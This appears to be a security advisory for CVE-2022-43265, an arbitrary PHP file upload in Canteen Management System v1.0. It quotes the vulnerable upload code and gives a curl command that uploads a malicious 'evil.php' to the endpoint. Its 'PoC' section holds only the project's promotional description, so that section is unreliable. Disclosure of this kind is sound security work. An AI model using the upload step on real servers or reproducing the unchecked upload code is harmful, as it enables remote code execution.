[file upload](https://10degres.net/tags/file-upload/)

An arbitrary file upload vulnerability in the component `/pages/save_user.php` of Canteen Management System v1.0 allows attackers to execute arbitrary code via a crafted PHP file.

* mitre: <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-43265>
* project page: <https://www.sourcecodester.com/php/15688/canteen-management-system-project-source-code-php.html>

---

**Description:**

Canteen Management System allows unrestricted file upload. An attacker user could craft a `multipart/form-data` request to upload a malicious PHP script.
This could lead to a OS Command Execution.

**Details:**

File: `/assets/pages/save_user.php`

```
$image = $_FILES['image']['name'];
$target = "../uploadImage/Profile/".basename($image);
if (move_uploaded_file($_FILES['image']['tmp_name'], $target)) {
    $msg = "Image uploaded successfully";
}else{
    $msg = "Failed to upload image";
}

```

**Step to reproduce:**

```
curl -I -F "image=@evil.php" "http://www.example.com/assets/pages/save_user.php"

```

The server replies with a status code `500` due to all PHP errors in the code but the file is successfully uploaded.

**PoC:**

This source code is about billing software for the canteen management system project. It is a project that needs billing software. The objective of this project is to provide a billing solution that will help in the management of the canteen and its employees, as well as their customers.

You can be considered this project as an ordering system for a school cafeteria. The goal is to design a system that will allow students to order food bills by themselves.

I developed this project by identifying the needs of the students and teachers. We determined that they need an ordering system that is fast, accurate, and easy to use. Next, I looked at different technologies available on the market. I found out that there are many technologies available to us but none of them are perfect for our needs so we needed to create our own solution. Finally, I came up with an idea for our project: using PHP technology so that students can get bills for food orders without waiting in line.

I provide high-quality software projects, thesis writing services, website development services, and web application development. If there is any need you can contact me by email.
